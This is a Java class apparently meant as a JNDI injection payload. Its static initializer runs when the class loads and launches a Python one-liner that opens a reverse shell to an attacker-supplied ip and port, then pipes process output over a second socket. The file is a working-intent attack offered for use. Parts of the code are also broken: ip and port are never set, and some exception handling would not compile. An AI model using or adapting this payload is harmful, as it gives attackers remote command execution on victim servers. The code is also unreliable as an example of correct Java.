import java.io.*;
import java.net.*;
import java.util.*;

public class JNDIObject {
    private static String ip;
    private static String port;
    private static String py_path;
    private static String[] cmd;

    static {
        try {
            // Detect operating system
            String os = System.getProperty("os.name").toLowerCase();
            String shell = "bash";
            String python = "python";

            if (os.contains("win")) {
                shell = "cmd.exe";
                python = "python";
            } else {
                shell = "bash";
                python = "python3";
            }

            // Set up command to spawn shell
            cmd = new String[]{python, "-c", "import socket, subprocess, os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"" + ip + "\"," + port + ")); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.Popen(\"" + shell + "\",shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE); p.wait();"};

            // Start the reverse shell
            ProcessBuilder pb = new ProcessBuilder(cmd);
            pb.redirectErrorStream(true);
            Process process = pb.start();

            // Create socket connection
            Socket socket = new Socket(ip, Integer.parseInt(port));
            InputStream in = socket.getInputStream();
            OutputStream out = socket.getOutputStream();

            // Redirect process streams to socket
            new Thread(() -> {
                try {
                    byte[] buffer = new byte[1024];
                    int read;
                    while ((read = in.read(buffer)) != -1) {
                        out.write(buffer, 0, read);
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }).start();

            new Thread(() -> {
                try {
                    byte[] buffer = new byte[1024];
                    int read;
                    while ((read = process.getInputStream().read(buffer)) != -1) {
                        out.write(buffer, 0, read);
                    }
                } catch (IOException | InterruptedException e) {
                    e.printStackTrace();
                }
            }).start();

            new Thread(() -> {
                try {
                    byte[] buffer = new byte[1024];
                    int read;
                    while ((read = process.getErrorStream().read(buffer)) != -1) {
                        out.write(buffer, 0, read);
                    }
                } catch (IOException | InterruptedException e) {
                    e.printStackTrace();
                }
            }).start();

            // Wait for process to finish
            process.waitFor();
            socket.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

